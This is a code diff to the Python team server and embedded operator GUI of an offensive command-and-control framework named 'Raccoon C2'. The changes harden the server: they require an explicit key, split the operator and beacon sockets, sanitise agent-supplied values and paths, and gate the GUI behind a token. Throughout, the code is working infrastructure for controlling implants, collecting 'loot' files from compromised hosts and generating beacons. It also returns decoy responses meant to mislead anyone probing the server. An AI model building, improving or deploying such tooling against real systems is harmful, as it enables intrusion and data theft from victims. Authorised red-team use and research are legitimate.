@@ -7,13 +7,18 @@ embedded operator GUI with TrashPandaPaws aesthetic.
 
 Usage:
   python server.py --port 443 --ssl
-  python server.py --port 8443 --key <base64-key>
-  python server.py --derive-key "https://c2.example.com/api/v1/beacon:c2.example.com"
+  RACCOON_KEY=<base64-key> python server.py --port 8443
+
+A key is required; there is no default and none is derived. Make one with:
+  python3 -c "import os,base64; print(base64.b64encode(os.urandom(32)).decode())"
+
+The key and the operator token are read from RACCOON_KEY and RACCOON_TOKEN, or
+given as --key and --token, which win. Prefer the variables: the command line
+is visible to every user in ps. The token is kept in <data dir>/operator-token.
 """
 
 import argparse
 import base64
-import hashlib
 import http.client
 import json
 import logging
@@ -33,6 +38,13 @@ from typing import Optional
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from flask import Flask, request, jsonify, send_file, send_from_directory, Response
+from werkzeug.serving import generate_adhoc_ssl_context, make_server
+
+try:
+    from software.c2.beacon import decode_key
+except ImportError:
+    # The container ships server.py and beacon.py side by side, not as a package.
+    from beacon import decode_key
 
 logger = logging.getLogger("raccoon.c2.server")
 server_log = logging.getLogger("raccoon.c2.events")
@@ -72,7 +84,6 @@ def _decoy_fields(n: int) -> dict:
 
 
 # ── Crypto (mirrors beacon._encrypt / _decrypt) ──
-
 
 class ServerCrypto:
     def __init__(self, key: bytes):
@@ -277,10 +288,40 @@ def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
 
 
 def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
-               server_config: Optional[dict] = None) -> Flask:
+               server_config: Optional[dict] = None,
+               operator_port: Optional[int] = None) -> Flask:
     app = Flask(__name__)
     static_dir = Path(__file__).parent / "static"
     _server_config = server_config or {}
+
+    # ── Socket policy ──
+    #
+    # The operator interface and the beacon endpoint are served on separate
+    # sockets, and a request is judged by the socket it arrived on. Not by
+    # its path: beacon_handler is the catch-all POST /<path:path>, on
+    # purpose, so a C2 profile can send beacons anywhere -- no prefix tells
+    # the two audiences apart. werkzeug reports each listener's own port in
+    # SERVER_PORT, so that is the discriminator.
+    #
+    # A request on the operator port may reach anything. A request on any
+    # other socket may reach only beacon_handler, and is otherwise given the
+    # catch-all's own cover answer, so a refusal is indistinguishable from
+    # it -- a 403 or a 404 would tell a prober what is listening.
+    #
+    # operator_port=None means no split is configured and the policy allows
+    # everything: one socket serves both, exactly as before. The test client
+    # goes through no socket at all, so denying when the socket is unknown
+    # would break every test and every single-socket deployment at once.
+    if operator_port is not None:
+        _operator_port = str(operator_port)
+
+        @app.before_request
+        def _socket_policy():
+            if request.environ.get("SERVER_PORT") == _operator_port:
+                return None
+            if request.endpoint == "beacon_handler":
+                return None
+            return _fake_response()
 
     # ── Operator auth ──
 
@@ -318,7 +359,9 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
 
     @app.route("/")
     def index():
-        return _OPERATOR_HTML.replace("{{TOKEN}}", operator_token)
+        # No authentication here, so nothing secret may be in the page: it
+        # asks for the token and keeps it in sessionStorage.
+        return _OPERATOR_HTML
 
     # ── Operator API ──
 
@@ -439,9 +482,13 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         return jsonify({
             "host": _server_config.get("host", "0.0.0.0"),
             "port": _server_config.get("port", 8443),
+            "operator_host": _server_config.get(
+                "operator_host", _server_config.get("host", "0.0.0.0")),
+            "operator_port": _server_config.get(
+                "operator_port", _server_config.get("port", 8443)),
             "ssl": _server_config.get("ssl", False),
             "cert": _server_config.get("cert", ""),
-            "key_type": _server_config.get("key_type", "default"),
+            "key_type": _server_config.get("key_type", "explicit"),
             "enc_key": key_b64,
             "operator_token": operator_token,
             "data_dir": str(data_dir),
@@ -1897,6 +1944,30 @@ def _fake_response():
     return jsonify({"status": "ok", "version": "2.1.0"}), 200
 
 
+def _as_int(value, default: int) -> int:
+    """An agent-reported number as an int, or ``default`` if it is not one.
+
+    Agents are not a trusted source of text: a string here would otherwise be
+    rendered into the operator page and break the arithmetic in /api/agents.
+    Accepts ints, floats and numeric strings alike (a float and its string
+    form must not behave differently), truncating toward zero. Booleans,
+    NaN, infinities and anything non-numeric give ``default``. The range is
+    not checked: negative and zero values are stored as reported.
+    """
+    if isinstance(value, bool) or not isinstance(value, (int, float, str)):
+        return default
+    try:
+        return int(value)
+    except (ValueError, OverflowError):
+        pass
+    if isinstance(value, str):
+        try:
+            return int(float(value))
+        except (ValueError, OverflowError):
+            pass
+    return default
+
+
 def _handle_register(payload: dict, crypto: ServerCrypto):
     implant_id = payload.get("id", "")
 
@@ -1907,8 +1978,8 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
                 "os": payload.get("os", ""),
                 "arch": payload.get("arch", ""),
                 "user": payload.get("user", ""),
-                "pid": payload.get("pid", 0),
-                "interval": payload.get("interval", 300),
+                "pid": _as_int(payload.get("pid"), 0),
+                "interval": _as_int(payload.get("interval"), 300),
                 "local_ips": payload.get("local_ips", []),
                 "caps": _clean_caps(payload),
                 "uplink_iface": payload.get("uplink_iface"),
@@ -1931,12 +2002,12 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
         "os": payload.get("os", ""),
         "arch": payload.get("arch", ""),
         "user": payload.get("user", ""),
-        "pid": payload.get("pid", 0),
-        "interval": payload.get("interval", 300),
+        "pid": _as_int(payload.get("pid"), 0),
+        "interval": _as_int(payload.get("interval"), 300),
         "local_ips": payload.get("local_ips", []),
         "proxy_mode": payload.get("proxy_mode", ""),
         "proxy_active": payload.get("proxy_active", ""),
-        "uptime": payload.get("uptime", 0),
+        "uptime": _as_int(payload.get("uptime"), 0),
         "caps": _clean_caps(payload),
         "uplink_iface": payload.get("uplink_iface"),
         "registered": _now(),
@@ -2008,9 +2079,9 @@ def _handle_beacon(payload: dict, crypto: ServerCrypto):
     if agent_id and agent_id in agents:
         agents[agent_id]["last_seen"] = _now()
         agents[agent_id]["_last_seen_ts"] = time.time()
-        agents[agent_id]["uptime"] = payload.get("uptime", 0)
-        agents[agent_id]["interval"] = payload.get("interval",
-                                                    agents[agent_id].get("interval", 300))
+        agents[agent_id]["uptime"] = _as_int(payload.get("uptime"), 0)
+        agents[agent_id]["interval"] = _as_int(
+            payload.get("interval"), agents[agent_id].get("interval", 300))
         if payload.get("local_ips"):
             agents[agent_id]["local_ips"] = payload["local_ips"]
         if payload.get("proxy_mode"):
@@ -2081,18 +2152,66 @@ def _handle_result(payload: dict, crypto: ServerCrypto, data_dir: Path):
     if data and data.get("data"):
         is_loot = data.get("loot", False)
         sub = "loot" if is_loot else "downloads"
-        dl_dir = data_dir / sub / agent_id
-        dl_dir.mkdir(parents=True, exist_ok=True)
-        filename = data.get("filename", f"{task_id}.bin")
-        ts = time.strftime("%Y%m%d-%H%M%S")
-        safe_name = f"{ts}_{filename}"
-        (dl_dir / safe_name).write_bytes(base64.b64decode(data["data"]))
-        logger.info("%s saved: %s/%s", sub.title(), agent_id, safe_name)
-        category = "LOOT" if is_loot else "DOWNLOAD"
-        _log_event(category, f"file={safe_name} saved to {dl_dir / safe_name}",
-                   agent_id=agent_id)
+        # Every outcome below, written or refused, falls through to the same
+        # ack: this route must not let a prober tell them apart. The payload
+        # is decoded before the registry is consulted so that undecodable
+        # data fails identically for a known and an unknown agent.
+        try:
+            content = base64.b64decode(data["data"])
+        except (ValueError, TypeError):
+            content = None
+            logger.warning("Refused %s write from %r: data is not base64",
+                           sub, agent_id)
+        dl_dir = None
+        if content is not None:
+            dl_dir = _agent_file_dir(data_dir, sub, agent_id)
+            if dl_dir is None:
+                logger.warning("Refused %s write for unknown or unsafe "
+                               "agent %r", sub, agent_id)
+        if dl_dir is not None:
+            dl_dir.mkdir(parents=True, exist_ok=True)
+            filename = _flat_filename(data.get("filename") or f"{task_id}.bin")
+            ts = time.strftime("%Y%m%d-%H%M%S")
+            stored_name = f"{ts}_{filename}"
+            (dl_dir / stored_name).write_bytes(content)
+            logger.info("%s saved: %s/%s", sub.title(), agent_id, stored_name)
+            category = "LOOT" if is_loot else "DOWNLOAD"
+            _log_event(category,
+                       f"file={stored_name} saved to {dl_dir / stored_name}",
+                       agent_id=agent_id)
 
     return jsonify(crypto.wrap({"ack": True}))
+
+
+def _agent_file_dir(data_dir: Path, sub: str, agent_id) -> Optional[Path]:
+    """The directory an agent's files go in, or None if it may not have one.
+
+    Agent IDs are server-generated and held in ``agents``; the one in a result
+    is whatever the sender wrote, so only a registered one is accepted. The
+    containment check runs on the *resolved* path: an absolute component
+    discards the base in ``base / x``, and ``..`` and symlinks only show their
+    effect after resolution. The directory must be exactly one level under
+    ``data_dir/sub`` and carry the agent's own name.
+    """
+    if not isinstance(agent_id, str) or agent_id not in agents:
+        return None
+    base = (data_dir / sub).resolve()
+    candidate = (base / agent_id).resolve()
+    if candidate.parent != base or candidate.name != agent_id:
+        return None
+    return candidate
+
+
+def _flat_filename(raw) -> str:
+    """An agent-supplied file name reduced to a basename of plain characters.
+
+    Everything up to the last path separator (either kind) is dropped, any
+    character outside ``[A-Za-z0-9._-]`` becomes ``_``, and leading dots go so
+    the result is never ``.`` or ``..`` or hidden.
+    """
+    name = re.split(r"[\\/]", str(raw))[-1]
+    name = re.sub(r"[^A-Za-z0-9._-]", "_", name).lstrip(".")
+    return name[:100] or "file.bin"
 
 
 # ── Operator HTML (embedded) ──
@@ -2967,6 +3086,16 @@ header .info{font-size:11px;color:var(--text2)}
 .bflow-or{display:flex;align-items:center;gap:0;width:100%;padding:2px 0}
 .bflow-or-line{flex:1;height:1px;background:rgba(255,255,255,0.08)}
 .bflow-or-badge{font-size:8px;color:var(--text2);padding:1px 8px;border:1px solid rgba(255,255,255,0.08);border-radius:8px;text-transform:uppercase;letter-spacing:0.04em}
+
+/* Token prompt */
+#token-gate{position:fixed;inset:0;z-index:200;display:none;align-items:center;justify-content:center;background:rgba(7,9,16,0.92)}
+#token-gate.open{display:flex}
+.tg-box{width:360px;padding:22px 24px;background:var(--surface);border:1px solid var(--border);border-radius:8px;display:flex;flex-direction:column;gap:10px}
+.tg-box h2{font-size:15px;color:var(--red);letter-spacing:0.04em}
+.tg-box p{font-size:12px;color:var(--text2);line-height:1.5}
+.tg-box input{padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;font-family:var(--mono);font-size:12px}
+.tg-box button{padding:7px 12px;background:var(--red-dim);color:#fff;border:0;border-radius:4px;font-weight:600;cursor:pointer}
+#tg-error{color:#ff6666;font-size:12px;display:none}
 </style>
 <link rel="stylesheet" href="/static/agent.css">
 </head>
@@ -3018,6 +3147,16 @@ header .info{font-size:11px;color:var(--text2)}
   </div>
 </div>
 <div class="toast-container" id="toast-container"></div>
+<div id="token-gate">
+  <div class="tg-box">
+    <h2>&#128274; Operator token</h2>
+    <p>The server's startup banner names the file it is in, on the <code>Token:</code> line. Kept in this tab only, and sent as a header, never in a URL.</p>
+    <div id="tg-error">That token was rejected. Enter it again.</div>
+    <input id="tg-input" type="password" aria-label="Operator token" autocomplete="off" spellcheck="false" placeholder="operator token"
+      onkeydown="if(event.key==='Enter') submitToken()">
+    <button type="button" onclick="submitToken()">Unlock</button>
+  </div>
+</div>
 <div class="srvlog-drawer" id="srvlog-drawer">
   <div class="srvlog-header">
     <span>&#128220; Server Log</span>
@@ -3028,8 +3167,7 @@ header .info{font-size:11px;color:var(--text2)}
 </div>
 
 <script>
-const TOKEN = "{{TOKEN}}";
-const H = {"Authorization":"Bearer "+TOKEN,"Content-Type":"application/json"};
+const TOKEN_KEY = "raccoon_token";
 let selectedAgent = null;
 let pollTimer = null;
 let cmdHistory = [];
@@ -3104,12 +3242,49 @@ document.addEventListener("click", e => {
   if(panel && panel.classList.contains("open") && !wrap) panel.classList.remove("open");
 });
 
+// The operator token lives only in this tab's sessionStorage: the page is
+// served without it, and it is sent as a header, never put in a URL.
+function storedToken(){
+  return sessionStorage.getItem(TOKEN_KEY) || "";
+}
+
+function H(){
+  return {"Authorization":"Bearer "+storedToken(),"Content-Type":"application/json"};
+}
+
+function askForToken(rejected){
+  const gate = document.getElementById("token-gate");
+  // Only ever shown, never hidden here: a poll that finds no token must not
+  // wipe the notice that the last one was rejected.
+  if(rejected) document.getElementById("tg-error").style.display = "block";
+  if(gate.classList.contains("open")) return;
+  gate.classList.add("open");
+  document.getElementById("tg-input").focus();
+}
+
+function submitToken(){
+  const value = document.getElementById("tg-input").value.trim();
+  if(!value) return;
+  sessionStorage.setItem(TOKEN_KEY, value);
+  location.reload();
+}
+
+// A rejected token is dropped, not retried: kept, it would survive a reload
+// and every poll would fail silently against it.
+function tokenRejected(){
+  sessionStorage.removeItem(TOKEN_KEY);
+  askForToken(true);
+}
+
 async function api(path, opts){
-  const r = await fetch(path, {headers:H, ...opts});
+  if(!storedToken()){ askForToken(false); throw new Error("no operator token"); }
+  const r = await fetch(path, {headers:H(), ...opts});
+  if(r.status === 401){ tokenRejected(); throw new Error("operator token rejected"); }
   return r.json();
 }
 
 async function refreshAgents(){
+  if(!storedToken()) return;
   const agents = await api("/api/agents");
   const list = document.getElementById("agent-list");
   list.innerHTML = "";
@@ -3147,6 +3322,7 @@ async function refreshAgents(){
 }
 
 async function checkTaskResults(){
+  if(!storedToken()) return;
   if(!selectedAgent) return;
   const hist = await api("/api/agents/"+selectedAgent+"/history");
   const prevLen = lastHistLen[selectedAgent]||0;
@@ -3185,7 +3361,7 @@ async function renderAgentView(id){
       <span class="agent-name">${esc(id)}</span>
       <span class="tag">${esc(info.arch||'?')}</span>
       <span class="tag">${esc(info.os||'?')}</span>
-      <span class="detail">${esc(info.user||'?')}@${esc(info.hostname||'?')} · PID ${info.pid||'?'} · up ${formatUptime(info.uptime||0)}</span>
+      <span class="detail">${esc(info.user||'?')}@${esc(info.hostname||'?')} · PID ${esc(info.pid||'?')} · up ${formatUptime(info.uptime||0)}</span>
       ${info.proxy_active ? '<span class="tag" style="background:#1a6e1a">PROXY: '+esc(info.proxy_active)+'</span>' : ''}
       ${info.c2_profile && info.c2_profile.active ? '<span class="tag" style="background:#4a1a6e;cursor:pointer" onclick="showBeaconConfig()" title="Click for details">&#128737; C2 Profile</span>' : '<span class="tag" style="background:#333;opacity:0.5">No C2 Profile</span>'}
     </div>
@@ -3322,7 +3498,7 @@ async function pollHistory(id){
 
 function esc(s){
   if(s==null) return "";
-  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;");
 }
 
 function timeSince(iso){
@@ -3498,7 +3674,7 @@ async function pollProcsResult(procsCmd){
   if(!body) return;
   if(last.status!=="ok"){ body.innerHTML='<div class="t-error">'+esc(last.output||"(error)")+'</div>'; return; }
   const info = await api("/api/agents/"+selectedAgent);
-  const pid = info && info.pid ? String(info.pid) : null;
+  const pid = info && Number.isInteger(info.pid) && info.pid > 0 ? String(info.pid) : null;
   const lines = (last.output||"").split("\n");
 
   const detectedTools = new Map();
@@ -3978,11 +4154,26 @@ async function runResponder(){
 }
 
 // ── Beacon Generator ──
+
+// The callback a new beacon should use, or "" when it cannot be known.
+// cfg.host is the beacon socket's bind address, and a specific one is the
+// answer. Bound to every interface, the page's own hostname is the only
+// other clue -- and through the documented SSH tunnel that is localhost,
+// which no remote beacon can reach. A beacon given it never registers and
+// nothing says why, so a loopback page host gives "" rather than a guess.
+function bgDefaultCallbackUrl(cfg, pageHost){
+  const anyHost = h => !h || h==="0.0.0.0" || h==="::" || h==="[::]";
+  const loopback = h => h==="localhost" || h==="::1" || h==="[::1]" || /^127\./.test(h);
+  let host = anyHost(cfg.host) ? (loopback(pageHost) ? "" : pageHost) : cfg.host;
+  if(!host) return "";
+  if(host.includes(":") && host[0]!=="[") host = "["+host+"]";
+  return (cfg.ssl ? "https" : "http")+"://"+host+":"+cfg.port+"/api/v1/beacon";
+}
+
 async function showBeaconGen(){
   const cfg = await api("/api/server/config");
   const gistCheck = await api("/api/server/beacon-gist/check");
-  const proto = cfg.ssl ? "https" : "http";
-  const defaultUrl = proto+"://"+location.hostname+":"+cfg.port+"/api/v1/beacon";
+  const defaultUrl = bgDefaultCallbackUrl(cfg, location.hostname);
   const ghOk = gistCheck.available;
   const overlay = document.createElement("div");
   overlay.className = "loot-overlay";
@@ -4004,6 +4195,7 @@ async function showBeaconGen(){
     +'</div>'
     +'<div id="bg-proto-https-opts" class="bgen-proto-opts">'
     +'<label>C2 Callback URL <input id="bg-url" value="'+esc(defaultUrl)+'" placeholder="https://c2.example.com:8443/api/v1/beacon"></label>'
+    +(defaultUrl ? '' : '<p id="bg-url-note" style="font-size:10px;color:var(--yellow);margin:2px 0 6px">&#9888; Not prefilled: this page is open on loopback, e.g. through an SSH tunnel, so it cannot tell which address beacons can reach. Enter the C2 host as the targets see it, port '+esc(String(cfg.port))+'.</p>')
     +'</div>'
     +'<div id="bg-proto-dns-opts" class="bgen-proto-opts" style="display:none">'
     +'<label>DNS Domain <input id="bg-dns-domain" placeholder="c2.example.com"></label>'
@@ -5913,8 +6105,10 @@ async function showLootViewer(){
 }
 
 async function lootSave(url, filename){
+  if(!storedToken()) return;
   try {
-    const r = await fetch(url, {headers:H});
+    const r = await fetch(url, {headers:H()});
+    if(r.status === 401){ tokenRejected(); return; }
     if(!r.ok){ toast("warn","Loot","Download failed: "+r.status,3000); return; }
     const blob = await r.blob();
     const a = document.createElement("a");
@@ -6068,7 +6262,7 @@ async function showBeaconConfig(){
       <div class="t-info" style="margin-bottom:12px">&#9881; Sleep / Jitter</div>
       <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
         <label style="color:var(--text2);font-size:12px;width:70px">Interval</label>
-        <input id="cfg-interval" type="number" min="1" max="86400" value="${curInterval}"
+        <input id="cfg-interval" type="number" min="1" max="86400" value="${esc(curInterval)}"
           style="width:80px;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;padding:6px 10px;color:var(--text);font-family:var(--mono);font-size:13px">
         <span style="color:var(--text2);font-size:12px">seconds</span>
       </div>
@@ -6130,7 +6324,7 @@ async function showBeaconConfig(){
   if(ap){
     const prof = info.c2_profile;
     if(prof && prof.active){
-      const tbl = (label, val) => '<div style="display:flex;gap:6px;padding:2px 0;font-size:11px"><span style="color:var(--text2);min-width:90px">'+label+'</span><span style="color:var(--text);word-break:break-all">'+esc(String(val))+'</span></div>';
+      const tbl = (label, val) => '<div style="display:flex;gap:6px;padding:2px 0;font-size:11px"><span style="color:var(--text2);min-width:90px">'+esc(label)+'</span><span style="color:var(--text);word-break:break-all">'+esc(String(val))+'</span></div>';
       const tagList = (items, color) => items.map(i => '<span style="display:inline-block;font-size:9px;padding:1px 6px;border-radius:3px;background:rgba('+color+',0.12);color:rgba('+color+',1);margin:1px 2px">'+esc(i)+'</span>').join("");
       let html = '<div style="background:rgba(197,134,192,0.06);border:1px solid rgba(197,134,192,0.2);border-radius:6px;padding:10px 12px">';
       html += '<div style="font-size:11px;font-weight:600;color:#c586c0;margin-bottom:6px">&#10004; Agent Profile Active</div>';
@@ -6175,7 +6369,7 @@ async function showBeaconConfig(){
   // Show last raw HTTP request from this beacon (proof that profile is applied)
   const lr = info._last_request;
   if(lr && ap){
-    const tbl = (label, val) => '<div style="display:flex;gap:6px;padding:2px 0;font-size:11px"><span style="color:var(--text2);min-width:90px">'+label+'</span><span style="color:var(--text);word-break:break-all;font-family:monospace">'+esc(String(val))+'</span></div>';
+    const tbl = (label, val) => '<div style="display:flex;gap:6px;padding:2px 0;font-size:11px"><span style="color:var(--text2);min-width:90px">'+esc(label)+'</span><span style="color:var(--text);word-break:break-all;font-family:monospace">'+esc(String(val))+'</span></div>';
     let rhtml = '<div style="background:rgba(86,156,198,0.06);border:1px solid rgba(86,156,198,0.2);border-radius:6px;padding:10px 12px;margin-top:10px">';
     rhtml += '<div style="font-size:11px;font-weight:600;color:#569cd6;margin-bottom:6px">&#128225; Last Beacon HTTP Request</div>';
     rhtml += tbl("Path", lr.path);
@@ -7409,9 +7603,7 @@ async function loadSettings(){
     const cfg = await api("/api/server/config");
     const proto = cfg.ssl ? "https" : "http";
     const listen = proto+"://"+cfg.host+":"+cfg.port;
-    const keyStatus = cfg.key_type === "default"
-      ? '<span class="cfg-value warn">DEFAULT (insecure!)</span>'
-      : '<span class="cfg-value ok">'+esc(cfg.key_type)+'</span>';
+    const keyStatus = '<span class="cfg-value ok">'+esc(cfg.key_type)+'</span>';
     const sslStatus = cfg.ssl
       ? '<span class="cfg-value secure">&#128274; Enabled'+(cfg.cert?' ('+esc(cfg.cert)+')':' (self-signed)')+'</span>'
       : '<span class="cfg-value warn">&#128275; Disabled</span>';
@@ -7420,9 +7612,9 @@ async function loadSettings(){
     body.innerHTML = `
       <div class="cfg-section">
         <div class="cfg-section-title">&#127760; Network</div>
-        <div class="cfg-row"><span class="cfg-label">Listen</span><span class="cfg-value">${esc(listen)}</span></div>
+        <div class="cfg-row"><span class="cfg-label">Beacons</span><span class="cfg-value">${esc(listen)}</span></div>
         <div class="cfg-row"><span class="cfg-label">SSL/TLS</span>${sslStatus}</div>
-        <div class="cfg-row"><span class="cfg-label">GUI</span><span class="cfg-value">${esc(proto+"://localhost:"+cfg.port)}</span></div>
+        <div class="cfg-row"><span class="cfg-label">GUI</span><span class="cfg-value">${esc(proto+"://"+(cfg.operator_host==="0.0.0.0"?"localhost":cfg.operator_host)+":"+cfg.operator_port)}</span></div>
       </div>
       <div class="cfg-section">
         <div class="cfg-section-title">&#128274; Security</div>
@@ -7478,10 +7670,14 @@ function copyToClipboard(text, label){
   });
 }
 
-setInterval(refreshAgents, 3000);
-setInterval(checkTaskResults, 2500);
-refreshAgents();
-toast("info","Server Online","Listening for beacon connections<br>Beacon traffic accepted on any POST path",6000);
+if(storedToken()){
+  setInterval(refreshAgents, 3000);
+  setInterval(checkTaskResults, 2500);
+  refreshAgents();
+  toast("info","Server Online","Listening for beacon connections<br>Beacon traffic accepted on any POST path",6000);
+} else {
+  askForToken(false);
+}
 </script>
 <script src="/static/agent.js" defer></script>
 </body>
@@ -7491,72 +7687,170 @@ toast("info","Server Online","Listening for beacon connections<br>Beacon traffic
 
 # ── CLI ──
 
+# Where the operator token is kept so the operator can read it without it
+# ever being on a command line or in a log: <data dir>/operator-token, 0600.
+_TOKEN_FILE = "operator-token"
+
+
+def _from_environment(name: str) -> Optional[str]:
+    """The variable's value, or None when it is unset or blank.
+
+    Removed from the environment as it is read, so the nxc, impacket and
+    other tools this server starts do not inherit the secret.
+    """
+    value = os.environ.pop(name, None)
+    return value.strip() if value and value.strip() else None
+
+
+def _write_operator_token(data_dir: Path, token: str) -> Path:
+    """Keep `token` in <data_dir>/operator-token, readable by its owner only.
+
+    Created at 0600 rather than created and then chmod-ed, so it is never
+    readable by anyone else, not even briefly. A file from an earlier run is
+    removed first, because open() applies the mode only to a file it creates
+    and would leave an older, looser one as it was; O_EXCL then also refuses
+    a link planted in its place. Raises OSError naming the path, never the
+    token.
+    """
+    path = data_dir / _TOKEN_FILE
+    try:
+        os.unlink(path)
+    except FileNotFoundError:
+        pass
+    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL | getattr(os, "O_NOFOLLOW", 0)
+    fd = os.open(path, flags, 0o600)
+    with os.fdopen(fd, "w", encoding="utf-8") as handle:
+        handle.write(token + "\n")
+    return path
+
+
 def main():
     parser = argparse.ArgumentParser(
         description="Raccoon C2 Team Server",
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    parser.add_argument("--host", default="0.0.0.0", help="Listen address")
-    parser.add_argument("--port", type=int, default=8443, help="Listen port")
-    parser.add_argument("--key", help="Base64-encoded 32-byte AES-GCM key")
+    parser.add_argument("--host", default="0.0.0.0",
+                        help="Beacon listen address (the agent socket)")
+    parser.add_argument("--port", type=int, default=8443,
+                        help="Beacon listen port (the agent socket)")
+    parser.add_argument("--operator-host", default="127.0.0.1",
+                        help="Operator GUI and API listen address "
+                             "(default: loopback only)")
+    parser.add_argument("--operator-port", type=int, default=8444,
+                        help="Operator GUI and API listen port; equal to "
+                             "--port serves both on one socket")
     parser.add_argument(
-        "--derive-key",
-        help="Derive key from 'callback_url:dns_domain' (must match beacon config)",
-    )
+        "--key",
+        help="Base64-encoded 32-byte AES-GCM key (required). Falls back to "
+             "$RACCOON_KEY; the flag wins when both are set. Prefer the "
+             "variable: the command line is visible to every user in ps.")
     parser.add_argument("--ssl", action="store_true", help="Enable HTTPS (self-signed)")
     parser.add_argument("--cert", help="SSL certificate file")
     parser.add_argument("--certkey", help="SSL private key file")
-    parser.add_argument("--token", help="Fixed operator token (default: random)")
+    parser.add_argument(
+        "--token",
+        help="Fixed operator token (default: random). Falls back to "
+             "$RACCOON_TOKEN; the flag wins when both are set. Prefer the "
+             "variable: the command line is visible to every user in ps. "
+             "Either way the token is kept in <data-dir>/operator-token, "
+             "and stays there after the server exits.")
     parser.add_argument(
         "--data-dir", default=str(Path.home() / ".raccoon-c2"),
         help="Data directory for state persistence",
     )
     args = parser.parse_args()
+    # 0 would bind an ephemeral port that the socket policy never matches:
+    # the GUI would be locked out, or beacons sent nowhere, with nothing said.
+    for flag, port in (("--port", args.port), ("--operator-port", args.operator_port)):
+        if not 1 <= port <= 65535:
+            parser.error(f"{flag} must be a port number, 1-65535 (got {port})")
 
     logging.basicConfig(
         level=logging.INFO,
         format="%(asctime)s [%(name)s] %(levelname)s %(message)s",
     )
 
-    if args.key:
-        key = base64.b64decode(args.key)
-    elif args.derive_key:
-        parts = args.derive_key
-        key = hashlib.sha256(parts.encode()).digest()
+    # Flag first, then the environment: the order agent/config.py uses.
+    env_key = _from_environment("RACCOON_KEY")
+    env_token = _from_environment("RACCOON_TOKEN")
+    if args.key and args.key.strip():
+        key_text, key_source = args.key, "--key"
+    elif env_key:
+        key_text, key_source = env_key, "RACCOON_KEY"
     else:
-        key = hashlib.sha256(b":").digest()
-        logger.warning("No encryption key specified — using default derived key")
-        logger.warning("Use --key or --derive-key for production")
+        key_text, key_source = None, "--key (or RACCOON_KEY)"
+    try:
+        key = decode_key(key_text, key_source)
+    except ValueError as exc:
+        refusal = str(exc)
+    else:
+        refusal = None
+    if refusal:
+        parser.error(refusal)
 
     crypto = ServerCrypto(key)
 
-    operator_token = args.token or secrets.token_urlsafe(24)
+    operator_token = args.token or env_token or secrets.token_urlsafe(24)
     data_dir = Path(args.data_dir)
     data_dir.mkdir(parents=True, exist_ok=True)
+    try:
+        token_path = _write_operator_token(data_dir, operator_token)
+    except OSError as exc:
+        parser.error("cannot write the operator token to %s (%s)"
+                     % (data_dir / _TOKEN_FILE,
+                        exc.strerror or type(exc).__name__))
 
     _load_state(data_dir)
     _setup_file_logging(data_dir)
-    _log_event("STARTUP", f"Server starting on {'https' if args.ssl else 'http'}://"
-               f"{args.host}:{args.port}")
+    proto = "https" if args.ssl else "http"
+    # Equal ports mean one socket for both audiences, as before this split
+    # existed: it binds --host, and the policy is left inert.
+    split = args.operator_port != args.port
+    operator_host = args.operator_host if split else args.host
+    listeners = [(args.host, args.port)]
+    if split:
+        listeners.append((operator_host, args.operator_port))
+    _log_event("STARTUP", "Server starting on " + ", ".join(
+        f"{proto}://{host}:{port}" for host, port in listeners))
 
     srv_config = {
         "host": args.host,
         "port": args.port,
+        "operator_host": operator_host,
+        "operator_port": args.operator_port,
         "ssl": args.ssl,
         "cert": args.cert or "",
-        "key_type": "explicit" if args.key else ("derived" if args.derive_key else "default"),
+        "key_type": "explicit",
         "start_time": time.time(),
     }
-    app = create_app(crypto, operator_token, data_dir, server_config=srv_config)
+    app = create_app(crypto, operator_token, data_dir, server_config=srv_config,
+                     operator_port=args.operator_port if split else None)
 
+    if not split:
+        network = (f"  Listen:   {proto}://{args.host}:{args.port}"
+                   "  (beacons and GUI on one socket)\n")
+    elif _is_loopback(operator_host):
+        network = (
+            f"  Beacons:  {proto}://{args.host}:{args.port}\n"
+            f"  GUI:      {proto}://{operator_host}:{args.operator_port}"
+            "  (loopback only)\n"
+            f"  Remote:   ssh -L {args.operator_port}:{operator_host}:"
+            f"{args.operator_port} <user>@<this-host>\n"
+            f"            then open {proto}://localhost:{args.operator_port}\n"
+        )
+    else:
+        network = (
+            f"  Beacons:  {proto}://{args.host}:{args.port}\n"
+            f"  GUI:      {proto}://{operator_host}:{args.operator_port}\n"
+        )
     banner = (
         f"\n{'=' * 60}\n"
         f"  Raccoon C2 Team Server\n"
         f"{'=' * 60}\n"
-        f"  Listen:   {'https' if args.ssl else 'http'}://{args.host}:{args.port}\n"
-        f"  Token:    {operator_token}\n"
+        f"{network}"
+        f"  Token:    in {token_path} (the GUI asks for it)\n"
         f"  Data:     {data_dir}\n"
-        f"  Key:      {'explicit' if args.key else 'derived' if args.derive_key else 'DEFAULT (insecure!)'}\n"
+        f"  Key:      supplied with {key_source}\n"
         f"{'=' * 60}\n"
     )
     try:
@@ -7574,16 +7868,21 @@ def main():
                 ssl_ctx.keylog_filename = keylog
                 logger.info("TLS keylog → %s", keylog)
         else:
-            ssl_ctx = "adhoc"
+            # Made once, so both sockets present the same certificate.
+            ssl_ctx = generate_adhoc_ssl_context()
             logger.info("Using self-signed certificate (install pyopenssl: pip install pyopenssl)")
 
-    app.run(
-        host=args.host,
-        port=args.port,
-        ssl_context=ssl_ctx,
-        debug=False,
-        threaded=True,
-    )
+    # One app object behind every socket: the agents, tasks and loot are
+    # module state, and the policy in create_app tells the sockets apart.
+    servers = [make_server(host, port, app, threaded=True, ssl_context=ssl_ctx)
+               for host, port in listeners]
+    for extra in servers[1:]:
+        threading.Thread(target=extra.serve_forever, daemon=True).start()
+    servers[0].serve_forever()
+
+
